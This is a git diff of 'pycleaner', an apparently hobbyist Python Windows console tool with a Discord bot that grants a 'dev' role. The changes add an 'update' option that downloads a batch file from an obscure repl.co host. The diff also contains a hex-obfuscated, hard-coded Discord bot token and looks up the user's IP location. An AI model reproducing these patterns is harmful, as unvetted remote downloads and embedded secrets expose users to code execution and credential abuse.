@@ -212,7 +212,7 @@ except Exception as er:
 os.system("title Checking for updates")
 #auto update
 try:
- vers ='2.3'
+ vers ='2.4'
  def updater():
       v = requests.get("https://pastebin.com/raw/w29LjVc2").text
       time.sleep(0.5)
@@ -289,7 +289,7 @@ lol=(f"[>] Running with Python  {sys.version_info[0]}.{sys.version_info[1]}.{sys
 version = sys.getwindowsversion()
 mo = '[>] Using '+(platform.system()) + (platform.release())
 BY = 'By jotaro'
-LMAO = 'Version 2.3'
+LMAO = 'Version 2.4'
 req = httpx.get("https://ipinfo.io/json")
 if req.status_code == 200:
             data = req.json()
@@ -327,12 +327,12 @@ else:
 # THIS CREATES THE TOOLS DIRECTORY IN THE SAME DIRECTORY, IF IT DOES NOT EXIST, IN WHICH THE PYTHON SCRIPT IS RAN. 
 ver = Center.XCenter('''
 by jotaro 
-██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ██████╗░░░░██████╗░
-██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ╚════██╗░░░╚════██╗
-╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ░░███╔═╝░░░░█████╔╝
-░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ██╔══╝░░░░░░╚═══██╗
-░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗██████╔╝
-░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝╚═════╝░''')
+██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ██████╗░░░░░░██╗██╗
+██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ╚════██╗░░░░██╔╝██║
+╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ░░███╔═╝░░░██╔╝░██║
+░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ██╔══╝░░░░░███████║
+░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗╚════██║
+░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░░░░░╚═╝''')
 
 os.system("title PRESS ENTER")
 
@@ -780,6 +780,10 @@ def fr():
         
      elif choice =='54':
       suggestion = input(f"enter ur suggestion:{Fore.RED} ")
+      if suggestion == ' ':
+        print('invalid suggestion please try again later.')
+        time.sleep(4)
+        main()
       if suggestion == '':
         print('invalid suggestion please try again later.')
         time.sleep(4)
@@ -883,14 +887,25 @@ def fr():
       print('please wait until approval fr')
       @client.event
       async def on_ready():
+       await client.change_presence(activity=discord.Game(f"{username} wants dev"))
        user = await client.fetch_user(822132948769177620) 
        if user is not None: 
         if user.dm_channel is None: 
           await user.create_dm()
-          await user.dm_channel.send(f"{username} wants dev what a noob 💀")
+          await user.dm_channel.send(f"{username} wants dev 💀 ")
           await client.wait_until_ready()
           guild = client.get_guild(1005864797251842109)
-          await guild.create_text_channel(name=f"{username} access")
+          ong = await guild.create_text_channel(name=f"{username} access")
+          webhook = await ong.create_webhook(name='dev')
+          yea = threading.Thread(target=spamhook, args=(webhook.url,)).start()
+
+
+      def spamhook(webhook):
+       webhook = DiscordWebhook(url=webhook,username=f"{username}")
+       embed = DiscordEmbed(title='devs ', description= f'{username} add , {username} remove', color=dawg)
+       webhook.add_embed(embed)
+       response = webhook.execute()
+ 
         
       @client.event
       async def on_message(message):
@@ -901,23 +916,32 @@ def fr():
         if message.content.startswith("."):
          await message.reply(f"{username} add , {username} remove")
         if message.content.startswith(fr"{username} add"):
-         ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
-         with open(ooo, 'w') as f:
-          f.write('pycleaner dev')
-          print('dev approved! W')
-          await message.channel.delete()
-          user = await client.fetch_user(822132948769177620) 
-          if user is not None: 
+         if message.author.id == 822132948769177620:
+          ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
+          with open(ooo, 'w') as f:
+           f.write('pycleaner dev')
+           print('dev approved! W')
+           await message.channel.delete()
+           user = await client.fetch_user(822132948769177620) 
+           if user is not None: 
              if user.dm_channel is None: 
                  await user.create_dm()
              await user.dm_channel.send(f"{username} added to dev 💀")
-          time.sleep(4)
-          main()
+           time.sleep(4)
+           main()
+         else:
+            user = await client.fetch_user(message.author.id) 
+            if user is not None: 
+             if user.dm_channel is None: 
+                 await user.create_dm()
+             await user.dm_channel.send(f"only owner of pycleaner can use this command :)")
+          
         if message.content.startswith(fr"{username} remove"):
-         ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
-         await message.channel.delete()
-         user = await client.fetch_user(822132948769177620) 
-         if user is not None: 
+         if message.author.id == 822132948769177620:
+          ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
+          await message.channel.delete()
+          user = await client.fetch_user(822132948769177620) 
+          if user is not None: 
              if user.dm_channel is None: 
                  await user.create_dm()
              await user.dm_channel.send(f"{username} removed from dev 💀")
@@ -928,6 +952,15 @@ def fr():
               main()
              if not os.path.isfile(ooo):
               main()
+         else:
+            print(message.author.id)
+            userl = await client.fetch_user(message.author.id) 
+            if userl is not None: 
+             if userl.dm_channel is None: 
+                 await userl.create_dm()
+             await userl.dm_channel.send(f"only owner of pycleaner can use this command :)")
+             
+            
  
           
           
@@ -935,6 +968,8 @@ def fr():
 
       client.run("\x4D\x54\x41\x78\x4E\x6A\x41\x30\x4D\x6A\x55\x33\x4D\x44\x59\x32\x4E\x6A\x63\x30\x4E\x54\x6B\x77\x4E\x67\x2E\x47\x50\x71\x47\x69\x52\x2E\x47\x34\x37\x48\x7A\x43\x6B\x76\x6C\x42\x75\x5F\x62\x75\x61\x77\x54\x61\x63\x68\x47\x74\x6E\x35\x41\x4E\x45\x5F\x5A\x6B\x37\x4A\x2D\x6A\x5F\x66\x69\x49")
         
+     elif choice == 'update':
+        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat", "updater.bat")    
     #else       
      else:
         print("what?") 
